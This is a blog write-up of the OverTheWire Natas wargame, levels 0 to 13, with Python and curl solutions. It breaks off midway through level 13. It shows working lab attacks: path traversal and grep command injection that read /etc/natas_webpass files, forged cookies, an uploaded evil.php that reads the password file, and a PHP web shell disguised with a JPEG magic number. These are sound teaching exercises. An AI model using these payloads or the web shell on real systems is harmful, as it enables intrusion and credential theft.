<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Natas (OverTheWire)</title>
<meta name="generator" content="Org mode" />
<link rel='stylesheet' href='/css/default.css' />
<link rel='stylesheet' href='/css/source-code.css' />
</head>
<body>
<div id="preamble" class="status">
<h1 id='site-name'>Bryan Rinders</h1>
<div id='menu'>
  <a href='/'>Home</a>
  <a href='/ctf-index.html'>CTF WriteUps</a>
  <a href='/emacs-index.html'>Emacs</a>
  <a href='/linux-index.html'>Linux Tutorials</a>
  <a href='https://gitlab.com/bryos/dotfiles' target='_blank'>Dotfiles</a>
  <a href='/other-index.html'>Other</a>
  <span class='right'>
    <a href='/sitemap.html'>Sitemap</a>
  </span>
</div>
<br><hr>
</div>
<div id="content">
<h1 class="title">Natas (OverTheWire)</h1>
<div id="table-of-contents">
<h2>Table of Contents</h2>
<div id="text-table-of-contents">
<ul>
<li><a href="#Introduction">Introduction</a></li>
<li><a href="#Level-0">Level 0</a></li>
<li><a href="#Level-1">Level 1</a></li>
<li><a href="#Level-2">Level 2</a></li>
<li><a href="#Level-3">Level 3</a></li>
<li><a href="#Level-4">Level 4</a></li>
<li><a href="#Level-5">Level 5</a></li>
<li><a href="#Level-6">Level 6</a></li>
<li><a href="#Level-7">Level 7</a></li>
<li><a href="#Level-8">Level 8</a></li>
<li><a href="#Level-9">Level 9</a></li>
<li><a href="#Level-10">Level 10</a></li>
<li><a href="#Level-11">Level 11</a></li>
<li><a href="#Level-12">Level 12</a></li>
<li><a href="#Level-13">Level 13</a></li>
<li><a href="#Level-14">Level 14</a></li>
</ul>
</div>
</div>

<div id="outline-container-orgdbd49db" class="outline-2">
<h2 id="Introduction"><a href="#Introduction">Introduction</a></h2>
<div class="outline-text-2" id="text-Introduction">
<p>
<span class="timestamp-wrapper"><span class="timestamp">[2023-02-24 Fri]</span></span>
</p>

<p>
This is a writeup for the <a href="https://overthewire.org/wargames/">overthewire.org</a> war game Natas. To start a
level visit the URL <a href="http://natasx.natas.labs.overthewire.org">http://natasx.natas.labs.overthewire.org</a>, and
login with username: <code>natasX</code> and the password found in the previous
level, where <code>X</code> is the level number. All passwords for the next level
are also stored in /etc/natas_webpass/natasX, where X is the number of
the level.
</p>

<p>
In the scripts below <code>PASS_NATASX</code> is the password for level <code>X</code> as
found in the previous level.
</p>
</div>
</div>

<div id="outline-container-org31c7ea1" class="outline-2">
<h2 id="Level-0"><a href="#Level-0">Level 0</a></h2>
<div class="outline-text-2" id="text-Level-0">
<p>
View the source page and find the password:
</p>

<div class="org-src-container">
<pre class="src src-sh" id="org5e5e9b1">curl -u natas0:natas0 <span class="org-string">"http://natas0.natas.labs.overthewire.org/"</span> | grep natas1
</pre>
</div>

<pre class="example">
&lt;!--The password for natas1 is g9D9cREhslqBKtcA2uocGHPfMZVzeFK6 --&gt;
</pre>
</div>
</div>

<div id="outline-container-orgb1d3e5e" class="outline-2">
<h2 id="Level-1"><a href="#Level-1">Level 1</a></h2>
<div class="outline-text-2" id="text-Level-1">
<p>
View the source page by using a short cut key (for me <code>Ctrl+u</code>):
</p>

<div class="org-src-container">
<pre class="src src-sh" id="org16f7240">curl -u natas1:<span class="org-string">"${PASS_NATAS1}"</span> <span class="org-string">"http://natas1.natas.labs.overthewire.org/"</span> | grep natas2
</pre>
</div>

<pre class="example">
&lt;!--The password for natas2 is h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7 --&gt;
</pre>
</div>
</div>

<div id="outline-container-org33fb703" class="outline-2">
<h2 id="Level-2"><a href="#Level-2">Level 2</a></h2>
<div class="outline-text-2" id="text-Level-2">
<p>
Again view the source page. There is a line with a link to an image
</p>

<pre class="example">
&lt;img src="files/pixel.png"&gt;
</pre>

<p>
This links to <a
href="http://natas2.natas.labs.overthewire.org/files/pixel.png">
http://natas2.natas.labs.overthewire.org/files/pixel.png</a>,
note the <code>/files/pixels.png</code>. Which means it might be possible to
explorer the <code>/files</code> directory. Exploring
"<a href="http://natas2.natas.labs.overthewire.org/files/">http://natas2.natas.labs.overthewire.org/files/</a>" it shows that there
it another file called <code>users.txt</code> which contains the password for the
next level.
</p>

<div class="org-src-container">
<pre class="src src-sh" id="orgf7f3580">curl -u natas2:<span class="org-string">"${PASS_NATAS2}"</span> <span class="org-string">"http://natas2.natas.labs.overthewire.org/files/users.txt"</span> | grep natas3
</pre>
</div>

<pre class="example">
natas3:G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q
</pre>
</div>
</div>

<div id="outline-container-orgfdc0d14" class="outline-2">
<h2 id="Level-3"><a href="#Level-3">Level 3</a></h2>
<div class="outline-text-2" id="text-Level-3">
<p>
View the source and find the line
</p>

<pre class="example">
&lt;!-- No more information leaks!! Not even Google will find it this time... --&gt;
</pre>

<p>
which hints at the <code>robots.txt</code> file that contains the directories
webcrawlers are not supossed to visit. From the <code>robots.txt</code> we get
the directory <code>/s3cr3t/</code> which contains the <code>users.txt</code> file with the
password for natas4.
</p>

<div class="org-src-container">
<pre class="src src-sh" id="org565b4c3">curl -u natas3:<span class="org-string">"${PASS_NATAS3}"</span> <span class="org-string">"http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt"</span> | grep natas4
</pre>
</div>

<pre class="example">
natas4:tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm
</pre>
</div>
</div>

<div id="outline-container-org6486cc3" class="outline-2">
<h2 id="Level-4"><a href="#Level-4">Level 4</a></h2>
<div class="outline-text-2" id="text-Level-4">
<p>
NOTE: from level 4 and onwards the code snippets are written in
<code>Python</code> unless otherwise specified.
</p>

<p>
To get access to the password we need to come from the natas5 website as is
metioned on the website when first loging in.
</p>

<pre class="example">
Access disallowed. You are visiting from "" while authorized users should come
only from "http://natas5.natas.labs.overthewire.org/"
</pre>

<p>
It is possible to simulate this by setting the <b>referer</b> in the header of the get
request to the natas5 website.
</p>

<p>
First import some libraries and define a function that can find the
password in the raw html text these will be used throughout the
levels:
</p>

<div class="org-src-container">
<pre class="src src-python" id="org1c07b09"><span class="org-keyword">import</span> requests
<span class="org-keyword">from</span> requests.auth <span class="org-keyword">import</span> HTTPBasicAuth
<span class="org-keyword">import</span> re
</pre>
</div>

<div class="org-src-container">
<pre class="src src-python" id="orgdda18ec"><span class="org-keyword">def</span> <span class="org-function-name">find_pswd</span>(text):
    <span class="org-doc">""" Find the line with the password in the html text. """</span>
    <span class="org-variable-name">lines</span> = text.split(<span class="org-string">'\n'</span>)
    <span class="org-variable-name">bools</span> = <span class="org-builtin">list</span>(<span class="org-builtin">map</span>(<span class="org-keyword">lambda</span> x : <span class="org-string">"password"</span> <span class="org-keyword">in</span> x, lines))
    <span class="org-keyword">for</span> (b,line) <span class="org-keyword">in</span> <span class="org-builtin">zip</span>(bools,lines):
        <span class="org-keyword">if</span> b:
            <span class="org-keyword">return</span> line
</pre>
</div>

<p>
Lets also define a function that will return the user and the url that
we will need for every level.
</p>

<div class="org-src-container">
<pre class="src src-python"><span class="org-keyword">def</span> <span class="org-function-name">user_url</span>(lvl: <span class="org-builtin">int</span>):
    <span class="org-doc">""" Return the user name and url for LVL. """</span>
    <span class="org-variable-name">user</span> = <span class="org-string">"natas"</span> + <span class="org-builtin">str</span>(lvl)
    <span class="org-variable-name">url</span> = f<span class="org-string">"http://natas{lvl}.natas.labs.overthewire.org/"</span>
    <span class="org-keyword">return</span> user, url
</pre>
</div>

<p>
Now the code that changes the referer to natas5:
</p>

<div class="org-src-container">
<pre class="src src-python" id="orgf9e5b5e"><span class="org-variable-name">user</span>, <span class="org-variable-name">url</span> = user_url(4)
<span class="org-variable-name">headers</span> = {<span class="org-string">'referer'</span>: <span class="org-string">'http://natas5.natas.labs.overthewire.org/'</span>}

<span class="org-comment-delimiter"># </span><span class="org-comment">get request with the referer set to natas5</span>
<span class="org-variable-name">r</span> = requests.get(url, headers=headers, auth=HTTPBasicAuth(user,PASS_NATAS4))

<span class="org-keyword">print</span>(find_pswd(r.text))
</pre>
</div>

<pre class="example">
Access granted. The password for natas5 is Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD
</pre>
</div>
</div>

<div id="outline-container-orgb655085" class="outline-2">
<h2 id="Level-5"><a href="#Level-5">Level 5</a></h2>
<div class="outline-text-2" id="text-Level-5">
<p>
After logging in the web page shows:
</p>

<pre class="example">
Access disallowed. You are not logged in
</pre>

<p>
Lets inspect the headers to see what is happening
</p>

<div class="org-src-container">
<pre class="src src-python" id="org8d47886"><span class="org-variable-name">user</span>, <span class="org-variable-name">url</span> = user_url(5)

<span class="org-variable-name">r</span> = requests.get(url, auth=HTTPBasicAuth(user, PASS_NATAS5))
<span class="org-keyword">print</span>(r.headers)
</pre>
</div>

<pre class="example">
{'Date': 'Wed, 22 Feb 2023 14:54:38 GMT', 'Server': 'Apache/2.4.52 (Ubuntu)', 'Set-Cookie': 'loggedin=0', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Content-Length': '368', 'Keep-Alive': 'timeout=5, max=100', 'Connection': 'Keep-Alive', 'Content-Type': 'text/html; charset=UTF-8'}
</pre>


<p>
The output show that the the Set-cookie <code>loggedin=0</code>, if that is
changed to <code>loggedin=1</code> then that should give access to the password.
</p>

<div class="org-src-container">
<pre class="src src-python" id="org84b6d86"><span class="org-variable-name">user</span>, <span class="org-variable-name">url</span> = user_url(5)
<span class="org-variable-name">cookies</span> = {<span class="org-string">'loggedin'</span>: <span class="org-string">'1'</span>}

<span class="org-comment-delimiter"># </span><span class="org-comment">get request with the cookie set loggedin=1</span>
<span class="org-variable-name">r</span> = requests.get(url, cookies=cookies, auth=HTTPBasicAuth(user, PASS_NATAS5))
<span class="org-keyword">print</span>(find_pswd(r.text))
</pre>
</div>

<pre class="example">
Access granted. The password for natas6 is fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR&lt;/div&gt;
</pre>
</div>
</div>

<div id="outline-container-org1f0d3f1" class="outline-2">
<h2 id="Level-6"><a href="#Level-6">Level 6</a></h2>
<div class="outline-text-2" id="text-Level-6">
<p>
After logging in we are prompted to input a secret. The page source
contains the line:
</p>

<pre class="example">
&lt;div id="viewsource"&gt;&lt;a href="index-source.html"&gt;View sourcecode&lt;/a&gt;&lt;/div&gt;
</pre>

<p>
Then going to the url
<a href="http://natas6.natas.labs.overthewire.org/index-source.html">http://natas6.natas.labs.overthewire.org/index-source.html</a>
contains:
</p>

<pre class="example">
include "includes/secret.inc";
</pre>

<p>
follow this to the url
<a href="http://natas6.natas.labs.overthewire.org/includes/secret.inc">http://natas6.natas.labs.overthewire.org/includes/secret.inc</a>, which
reveals the secret: <code>FOEIUWGHFEEUHOFUOIU</code>
</p>

<div class="org-src-container">
<pre class="src src-python" id="org9a0cff3"><span class="org-variable-name">user</span>, <span class="org-variable-name">url</span> = user_url(6)
<span class="org-variable-name">post_data</span> = {<span class="org-string">"secret"</span>: <span class="org-string">"FOEIUWGHFEEUHOFUOIU"</span>, <span class="org-string">"submit"</span>: <span class="org-string">"submit"</span>}

<span class="org-variable-name">r</span> = requests.post(url, auth=HTTPBasicAuth(user, PASS_NATAS6), data=post_data)

<span class="org-keyword">print</span>(find_pswd(r.text))
</pre>
</div>

<pre class="example">
Access granted. The password for natas7 is jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr
</pre>
</div>
</div>

<div id="outline-container-org7e85a22" class="outline-2">
<h2 id="Level-7"><a href="#Level-7">Level 7</a></h2>
<div class="outline-text-2" id="text-Level-7">
<p>
The source page says:
</p>

<pre class="example">
&lt;!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 --&gt;
</pre>

<p>
and there are two links, <code>Home</code> and <code>About</code>. When you click on <code>Home</code>
or <code>About</code> the url changes to <code>/index.php?page=Home</code> and
<code>/index.php?page=About</code> respectively. Changing either <code>Home</code> or <code>About</code>
with the path to the password file will give access to the password,
i.e. <code>/index.php?page=/etc/natas_webpass/natas8</code>. This is know as a
<b>path traversal attack</b>.
</p>

<div class="org-src-container">
<pre class="src src-python" id="orge2d7a5b"><span class="org-variable-name">user</span>, <span class="org-variable-name">url</span> = user_url(7)
<span class="org-variable-name">pswd</span> = <span class="org-string">"7z3hEENjQtflzgnT29q7wAvMNfZdh0i9"</span>
<span class="org-variable-name">path</span> = <span class="org-string">"/index.php?page=/etc/natas_webpass/natas8"</span>

<span class="org-comment-delimiter"># </span><span class="org-comment">get request with the referer set to natas5</span>
<span class="org-variable-name">r</span> = requests.post(url+path, auth=HTTPBasicAuth(user,PASS_NATAS7))

<span class="org-keyword">print</span>(r.text.split(<span class="org-string">'\n'</span>)[-7])
</pre>
</div>

<pre class="example">
a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB
</pre>
</div>
</div>

<div id="outline-container-org190b354" class="outline-2">
<h2 id="Level-8"><a href="#Level-8">Level 8</a></h2>
<div class="outline-text-2" id="text-Level-8">
<p>
The source page again has a link to:
</p>

<pre class="example">
index-source.html
</pre>

<p>
which reveals an encoded secret:
</p>

<pre class="example">
3d3d516343746d4d6d6c315669563362
</pre>

<p>
it is encoded with this function:
</p>

<pre class="example">
function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}
</pre>

<p>
All we need to do is reverse this function on the given encoded secret:
</p>

<div class="org-src-container">
<pre class="src src-python" id="org3333998"><span class="org-keyword">from</span> base64 <span class="org-keyword">import</span> b64decode

<span class="org-variable-name">secret</span> = <span class="org-string">"3d3d516343746d4d6d6c315669563362"</span>

<span class="org-comment-delimiter"># </span><span class="org-comment">convert hex to binary</span>
<span class="org-variable-name">binary_secret</span> = <span class="org-builtin">bin</span>(<span class="org-builtin">int</span>(secret, 16))

<span class="org-comment-delimiter"># </span><span class="org-comment">convert the bits to a string of chars</span>
<span class="org-variable-name">char_secret</span> = <span class="org-string">''</span>.join(<span class="org-builtin">chr</span>(<span class="org-builtin">int</span>(binary_secret[i*8:i*8+8],2)) <span class="org-keyword">for</span> i <span class="org-keyword">in</span> <span class="org-builtin">range</span>(<span class="org-builtin">len</span>(binary_secret)//8))

<span class="org-comment-delimiter"># </span><span class="org-comment">reverse the string</span>
<span class="org-variable-name">reverse_secret</span>  = char_secret[::-1]

<span class="org-comment-delimiter"># </span><span class="org-comment">base64 decode the string</span>
<span class="org-variable-name">decoded_secret</span> = b64decode(reverse_secret).decode(<span class="org-string">"ascii"</span>)
<span class="org-keyword">print</span>(<span class="org-string">"The decoded secret is: "</span> + decoded_secret)
</pre>
</div>

<pre class="example">
The decoded secret is: oubWYf2kBq
</pre>


<p>
Now we can POST the <code>DECODED_SECRET:</code> 
<code>oubWYf2kBq</code>, to get the password.
</p>

<div class="org-src-container">
<pre class="src src-python" id="org28d66f3"><span class="org-variable-name">user</span>, <span class="org-variable-name">url</span> = user_url(8)
<span class="org-variable-name">post_data</span> = {<span class="org-string">"secret"</span>: DECODED_SECRET, <span class="org-string">"submit"</span>: <span class="org-string">"submit"</span>}

<span class="org-comment-delimiter"># </span><span class="org-comment">get request with the referer set to natas5</span>
<span class="org-variable-name">r</span> = requests.post(url, auth=HTTPBasicAuth(user, PASS_NATAS8), data=post_data)

<span class="org-keyword">print</span>(find_pswd(r.text))
</pre>
</div>

<pre class="example">
Access granted. The password for natas9 is Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd
</pre>
</div>
</div>

<div id="outline-container-org8d4b655" class="outline-2">
<h2 id="Level-9"><a href="#Level-9">Level 9</a></h2>
<div class="outline-text-2" id="text-Level-9">
<p>
On the site there is a search box that searches for words. Trying out
some words in the search box shows that it actual does find all words
containing the searched string. Inspecting the source reveals this
piece of code:
</p>

<pre class="example">
if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
</pre>

<p>
So it is using <code>grep</code> to find results from <code>dictionary.txt</code>, but
<code>grep</code> allows for multiple input files to search in and so if we input
an extra file into the search box then it will search that file as
well as <code>dictionary.txt</code>. The file we want to include in the submit
box is <code>etc/natas_webpass/natas10</code>, the file that holds the password
for the next level.
</p>

<div class="org-src-container">
<pre class="src src-python" id="org3d54a93"><span class="org-variable-name">user</span>, <span class="org-variable-name">url</span> = user_url(9)
<span class="org-variable-name">post_data</span> = {<span class="org-string">"needle"</span>: <span class="org-string">"'' /etc/natas_webpass/natas10"</span>, <span class="org-string">"submit"</span>: <span class="org-string">"submit"</span>}

<span class="org-variable-name">r</span> = requests.post(url, auth=HTTPBasicAuth(user, PASS_NATAS9), data=post_data)

<span class="org-comment-delimiter"># </span><span class="org-comment">use regex to find the password</span>
<span class="org-keyword">print</span>(re.findall(<span class="org-string">'/etc/natas_webpass/natas10:(.*)'</span>, r.text)[0])
</pre>
</div>

<pre class="example">
D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE
</pre>
</div>
</div>

<div id="outline-container-org4bdd839" class="outline-2">
<h2 id="Level-10"><a href="#Level-10">Level 10</a></h2>
<div class="outline-text-2" id="text-Level-10">
<p>
This level is similar to the previous level but it checks if there are
"illegal" characters in the input.
</p>

<pre class="example">
if($key != "") {
    if(preg_match('/[;|&amp;]/',$key)) {
	print "Input contains an illegal character!";
    } else {
	passthru("grep -i $key dictionary.txt");
    }
}
</pre>

<p>
From the regular expression in 'preg_match' the illegal characters are
<code>;</code> and <code>&amp;</code>. Since those characters weren't used in the previous level
it is possible to re-use the 'needle' from level 9.
</p>

<div class="org-src-container">
<pre class="src src-python" id="org9843a22"><span class="org-variable-name">user</span>, <span class="org-variable-name">url</span> = user_url(10)
<span class="org-variable-name">post_data</span> = {<span class="org-string">"needle"</span>: <span class="org-string">"'' /etc/natas_webpass/natas11"</span>, <span class="org-string">"submit"</span>: <span class="org-string">"submit"</span>}

<span class="org-variable-name">r</span> = requests.post(url, auth=HTTPBasicAuth(user, PASS_NATAS10), data=post_data)

<span class="org-keyword">print</span>(re.findall(<span class="org-string">'/etc/natas_webpass/natas11:(.*)'</span>, r.text)[0])
</pre>
</div>

<pre class="example">
1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg
</pre>
</div>
</div>

<div id="outline-container-org8adc7c1" class="outline-2">
<h2 id="Level-11"><a href="#Level-11">Level 11</a></h2>
<div class="outline-text-2" id="text-Level-11">
</div>
<div id="outline-container-org84a4474" class="outline-3">
<h3 id="Level-11-Intro"><a href="#Level-11-Intro">Intro</a></h3>
<div class="outline-text-3" id="text-Level-11-Intro">
<p>
From the source code, these are the most important
functions/variables:
</p>

<pre class="example">
$defaultdata = array( "showpassword"=&gt;"no", "bgcolor"=&gt;"#ffffff");

function xor_encrypt($in) {
    $key = '&lt;censored&gt;';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i&lt;strlen($text);$i++) {
	$outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}
</pre>

<p>
The <code>xor_encrypt()</code> function simply encrypts the input with a censored
key. And the <code>saveData()</code> creates a cookie from the
<code>$defaultdata</code>. The first thing to do is get a cookie. With this
cookie and the <code>defaultdata</code> it is possible to exploit a property of
the xor function, namely: <code>plaintext ^ key = ciphertext</code> (where <code>^</code> is
the xor function) can be rewritten to solve for the key like
<code>plaintext ^ ciphertext = key</code>. Hence we can find the key with
<code>plaintext = $defaultdata</code> and <code>ciphertext = cookie</code>.
</p>
</div>
</div>

<div id="outline-container-org63119eb" class="outline-3">
<h3 id="Get-the-cookie-(cipher-text)"><a href="#Get-the-cookie-(cipher-text)">Get the cookie (cipher text)</a></h3>
<div class="outline-text-3" id="text-Get-the-cookie-(cipher-text)">
<p>
So lets get a cookie:
</p>

<div class="org-src-container">
<pre class="src src-python" id="orgda4efae"><span class="org-variable-name">user</span>, <span class="org-variable-name">url</span> = user_url(11)
<span class="org-variable-name">data</span> = {<span class="org-string">"bgcolor"</span>: <span class="org-string">"#000000"</span>, <span class="org-string">"submit"</span>: <span class="org-string">"Set color"</span>}

<span class="org-variable-name">r</span> = requests.post(url, auth=HTTPBasicAuth(user, PASS_NATAS11), data=data)

<span class="org-keyword">print</span>(r.headers)
</pre>
</div>

<pre class="example">
{'Date': 'Wed, 22 Feb 2023 17:18:39 GMT', 'Server': 'Apache/2.4.52 (Ubuntu)', 'Set-Cookie': 'data=MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5ofnh8e354bjY%3D', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Content-Length': '486', 'Keep-Alive': 'timeout=5, max=100', 'Connection': 'Keep-Alive', 'Content-Type': 'text/html; charset=UTF-8'}
</pre>


<p>
The <code>Set-Cookie</code> value is what we are looking for.
</p>

<div class="org-src-container">
<pre class="src src-python" id="org1e92197"><span class="org-variable-name">cookie</span> = r.headers[<span class="org-string">'Set-Cookie'</span>][5:]
<span class="org-keyword">print</span>(f<span class="org-string">'The cookie is: {cookie}'</span>)
</pre>
</div>

<pre class="example">
The cookie is: MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5ofnh8e354bjY%3D
</pre>


<p>
This cookie is url encode as can be seen by the <code>%3D</code> at the end. Lets
decode it:
</p>

<div class="org-src-container">
<pre class="src src-python" id="orgadc3753"><span class="org-keyword">from</span> urllib.parse <span class="org-keyword">import</span> unquote

<span class="org-variable-name">url_decoded_cookie</span> = unquote(cookie)
<span class="org-keyword">print</span>(f<span class="org-string">'The url decoded cookie is:\n{url_decoded_cookie}'</span>)
</pre>
</div>

<pre class="example">
The url decoded cookie is:
MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5ofnh8e354bjY=
</pre>


<p>
The <code>=</code> show that the decoded cookie is likely base 64 encoded, let
decode it.
</p>

<div class="org-src-container">
<pre class="src src-python" id="org383393e"><span class="org-keyword">from</span> base64 <span class="org-keyword">import</span> b64decode

<span class="org-variable-name">base64_decoded_cookie</span> = b64decode(url_decoded_cookie).<span class="org-builtin">hex</span>()
<span class="org-keyword">print</span>(f<span class="org-string">'The cookie/cipher text in hex is:\n{base64_decoded_cookie}'</span>)
</pre>
</div>

<pre class="example">
The cookie/cipher text in hex is:
306c3b242439382d383d3f23392a6a766920276e676c2a2b28212423396c726e687e787c7b7e786e36
</pre>
</div>
</div>

<div id="outline-container-org6c2954a" class="outline-3">
<h3 id="Get-the-plain-text"><a href="#Get-the-plain-text">Get the plain text</a></h3>
<div class="outline-text-3" id="text-Get-the-plain-text">
<p>
Now to get the plaintext that is used in the <code>xor_encrypt()</code> json
encode the <code>defaultdata</code> first.
</p>

<div class="org-src-container">
<pre class="src src-php" id="orga3a26ce">// this is php code:
$defaultdata = array( "showpassword"=&gt;"no", "bgcolor"=&gt;"#ffffff");
json_encode($defaultdata);
echo (json_encode($defaultdata));
</pre>
</div>

<pre class="example">
{"showpassword":"no","bgcolor":"#ffffff"}
</pre>
</div>
</div>

<div id="outline-container-org3c71492" class="outline-3">
<h3 id="Find-the-encryption-key"><a href="#Find-the-encryption-key">Find the encryption key</a></h3>
<div class="outline-text-3" id="text-Find-the-encryption-key">
<p>
Now use the plain and cipher text in a slightly rewritten
<code>xor_encrypt()</code> to find the key.
</p>

<div class="org-src-container">
<pre class="src src-php" id="org9469d03">// this is php code:
$defaultdata = array( "showpassword"=&gt;"no", "bgcolor"=&gt;"#ffffff");

function xor_encrypt($in, $key) {
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i&lt;strlen($text);$i++) {
	$outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

$plain = json_encode($defaultdata);
$cipher = hex2bin('0a554b221e00482b02044f2503131a70531957685d555a2d12185425035502685247087a414708680c');

echo ('The key is: ' . xor_encrypt($plain, $cipher));

</pre>
</div>

<pre class="example">
The key is: qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq!n'!nJq
</pre>


<p>
There is a pattern in the key which means that the key that was used
is the substring <code>qw8J</code>.
</p>
</div>
</div>

<div id="outline-container-org7ec4dff" class="outline-3">
<h3 id="Get-the-password-for-natas12"><a href="#Get-the-password-for-natas12">Get the password for natas12</a></h3>
<div class="outline-text-3" id="text-Get-the-password-for-natas12">
<p>
To get the password change the <code>showpassword</code> value from the array
<code>$defaultdata</code> to "yes". Then encrypt the array with the key
<code>qw8J</code>. This will result in the value that should be send as the
cookie and will give the password.
</p>

<div class="org-src-container">
<pre class="src src-php" id="orgd3b51b4">// this is php code:
$defaultdata = array( "showpassword"=&gt;"yes", "bgcolor"=&gt;"#ffffff");

function xor_encrypt($in, $key) {
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i&lt;strlen($text);$i++) {
	$outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

$plain = json_encode($defaultdata);
$key = 'qw8J';

echo ('The cipher text is: ' . base64_encode(xor_encrypt($plain, $key)));

</pre>
</div>

<pre class="example">
The cipher text is: ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
</pre>


<p>
Use the just computed cipher text as the cookie and send a get request
with the cookie attached. This will show the password for Natas 12.
</p>

<div class="org-src-container">
<pre class="src src-python" id="org3c87a20"><span class="org-variable-name">user</span>, <span class="org-variable-name">url</span> = user_url(11)
<span class="org-variable-name">data</span> = {<span class="org-string">"bgcolor"</span>: <span class="org-string">"#000000"</span>, <span class="org-string">"submit"</span>: <span class="org-string">"Set color"</span>}
<span class="org-variable-name">cookies</span> = {<span class="org-string">'data'</span>: <span class="org-string">'ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK'</span>}

<span class="org-comment-delimiter"># </span><span class="org-comment">get request with the referer set to natas5</span>
<span class="org-variable-name">r</span> = requests.get(url, cookies=cookies, auth=HTTPBasicAuth(user, PASS_NATAS11))

<span class="org-keyword">print</span>(re.findall(<span class="org-string">'The password for natas12 is (.*)&lt;br&gt;'</span>, r.text)[0])
</pre>
</div>

<pre class="example">
EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
</pre>
</div>
</div>
</div>

<div id="outline-container-orgcace1d6" class="outline-2">
<h2 id="Level-12"><a href="#Level-12">Level 12</a></h2>
<div class="outline-text-2" id="text-Level-12">
<p>
The webpage asks for .jpg files to be uploaded. After uploading a
picture a link is given to the location, <code>upload/&lt;randomstring&gt;.jpg</code>,
of the uploaded file. I tried a few path traversal attacks,
e.g. <code>/upload/../etc/natas_webpass/natas13</code>, but all failed. So maybe
it is possible to upload some malicious php code instead of a jpg.
</p>

<p>
Create a php file called <code>evil.php</code> that contains:
</p>
<pre class="example">
&lt;?php echo (file_get_contents('/etc/natas_webpass/natas13')); ?&gt;
</pre>
<p>
This will print the password for natas13.
</p>

<p>
Now the python script that uploads <code>evil.php</code> to the website and gets
the randon link to the uploaded file location, which should contain
the password for natas13.
</p>

<div class="org-src-container">
<pre class="src src-python" id="orgf8d3297"><span class="org-variable-name">user</span>, <span class="org-variable-name">url</span> = user_url(12)

<span class="org-variable-name">evil</span> = {<span class="org-string">'uploadedfile'</span>: <span class="org-builtin">open</span>(<span class="org-string">'/home/br/Pictures/shots/evil.php'</span>, <span class="org-string">'rb'</span>)}

<span class="org-variable-name">r</span> = requests.post(url, auth=HTTPBasicAuth(user, PASS_NATAS12), files=evil, data={<span class="org-string">'filename'</span>: <span class="org-string">'evil.php'</span>})

<span class="org-variable-name">path</span> = re.findall(<span class="org-string">'href="(upload/.*.php)"&gt;'</span>, r.text)[0]
<span class="org-keyword">print</span>(f<span class="org-string">'The path to our uploaded file: {path}'</span>)
</pre>
</div>

<pre class="example">
The path to our uploaded file: upload/tdxpbrtuna.php
</pre>


<div class="org-src-container">
<pre class="src src-python" id="orgd42805a"><span class="org-variable-name">r1</span> = requests.get(url+path, auth=HTTPBasicAuth(user, PASS_NATAS12))
<span class="org-comment-delimiter"># </span><span class="org-comment">The password for natas13:</span>
<span class="org-keyword">print</span>(r1.text)
</pre>
</div>

<pre class="example">
jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
</pre>
</div>
</div>

<div id="outline-container-org2a4747d" class="outline-2">
<h2 id="Level-13"><a href="#Level-13">Level 13</a></h2>
<div class="outline-text-2" id="text-Level-13">
<p>
This level is similar to level 12 but it uses <code>exif_imagetype</code> to
check if the file being uploaded is actually an image. It does this by
checking the <b>magic number</b> at the beginning of the file. So if we can
insert this <i>magic number</i> to the beginning of our php script than it
will pass the <code>exif_imagetype</code> check will the server will execute the
contents of the file. We will insert the <i>magic number</i> by letting
python write it to the file in bytes. The rest of the attack is very
similar to level 12. The <i>magic number</i> is <code>\xFF\xD8\xFF\xE0</code>.
</p>

<div class="org-src-container">
<pre class="src src-python" id="org1cb02d3"><span class="org-variable-name">user</span>, <span class="org-variable-name">url</span> = user_url(13)

<span class="org-comment-delimiter"># </span><span class="org-comment">write the magic number and the to be executed php to evilFile</span>
<span class="org-variable-name">evilFile</span> = <span class="org-string">'/home/br/Pictures/shots/evil3.php'</span>
<span class="org-variable-name">fh</span> = <span class="org-builtin">open</span>(evilFile, <span class="org-string">'wb'</span>)
fh.write(b<span class="org-string">'\xFF\xD8\xFF\xE0'</span> + b<span class="org-string">'&lt;? passthru($_GET["cmd"]); ?&gt;'</span>)
fh.close()

<span class="org-variable-name">evil</span> = {<span class="org-string">'uploadedfile'</span>: <span class="org-builtin">open</span>(evilFile, <span class="org-string">'rb'</span>)}

